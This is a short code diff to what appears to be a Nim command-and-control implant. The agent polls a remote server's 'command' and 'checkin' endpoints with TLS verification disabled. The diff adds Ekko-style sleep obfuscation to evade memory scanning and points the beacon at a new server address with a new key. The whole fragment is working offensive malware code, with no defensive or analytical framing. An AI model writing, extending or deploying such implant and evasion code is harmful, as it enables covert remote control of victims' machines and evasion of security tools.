@@ -1,5 +1,6 @@
 import httpclient, base64, json, osproc, random, os, strutils, net
 include ./libs_agent/executeass
+include ./libs_agent/ekko
 
 proc get_request_headers(url: string, api_key: string, identifier:string):string =
     let client = newHttpClient(sslContext=newContext(verifyMode=CVerifyNone))
@@ -28,14 +29,15 @@ proc random_sleep(sleep_time:int):int =
 
 proc main() =
     randomize()
-    var secret_key = "RkRrcitEQ21QPDg5OEIwMWhxKVFDYyMzczpjISosMyxFL0MxL0RPVzpC"
-    var url = "https://127.0.0.1:8181/"
+    var secret_key = "RkRrcitEQ28hYTwsWGNpMWJfPGZAczJIT0Z0dXJMMilBdSpHXipqaENmTmU="
+    var url = "https://192.168.79.73/"
     var identifier = $(int(rand(float(100000000000000000))))
     var sleep_time = 1
     #echo $(random_sleep(sleep_time))
     #echo $identifier
     while true:
-        sleep random_sleep(sleep_time)
+        #sleep random_sleep(sleep_time)
+        ekkoObf(random_sleep(sleep_time))
         var command_response = get_request_headers($url&"command",$secret_key,$identifier)
         if $command_response == "registration_error":
             var output = get_request_headers(url&"checkin",$secret_key,$identifier)
